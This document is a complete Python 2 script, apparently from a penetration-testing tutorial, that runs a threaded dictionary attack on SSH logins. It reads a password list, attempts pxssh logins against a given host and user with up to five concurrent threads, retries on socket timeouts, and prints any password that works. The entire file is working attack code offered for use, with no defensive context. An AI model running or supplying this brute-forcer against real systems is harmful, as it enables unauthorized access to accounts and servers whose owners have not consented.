import pxssh
import optparse
import time
from threading import *

MAX_CONNECTIONS = 5

connection_lock = BoundedSemaphore(value = MAX_CONNECTIONS)
found = False
num_fails = 0

def connect(host, user, password, release):
    global found
    global num_fails
    try:
        s = pxssh.pxssh()
        s.force_password = True
        s.login(host, user, password, auto_prompt_reset = False)
        print '[+] Password Found: {0}'.format(password)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            print '[info] read_nonblocking'
            num_fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            print '[info] synchronize with original prompt'
            time.sleep(1)
            connect(host, user, password, False)
        else:
            print '[!] Unknown exception: {}'.format(str(e))
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest = 'target_host', type = 'string', help = 'specify target host')
    parser.add_option('-F', dest = 'passwd_file', type = 'string', help = 'specify password file')
    parser.add_option('-u', dest = 'user', type = 'string', help = 'specify the user')
    options, args = parser.parse_args()
    
    host = options.target_host
    passwd_file = options.passwd_file
    user = options.user
    if host == None or passwd_file == None or user == None:
        print parser.usage
        exit(0)
    with open(passwd_file, 'r') as f:
        for line in f.readlines():
            if found:
                print "[*] Password Found"
                exit(0)
            if num_fails > 5:
                print '[!] Exiting: Too Many Socket Timeouts'
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print '[-] Testing: {0}'.format(password)
            t = Thread(target = connect, args = (host, user, password, True))
            child = t.start()

if __name__ == '__main__':
    main()
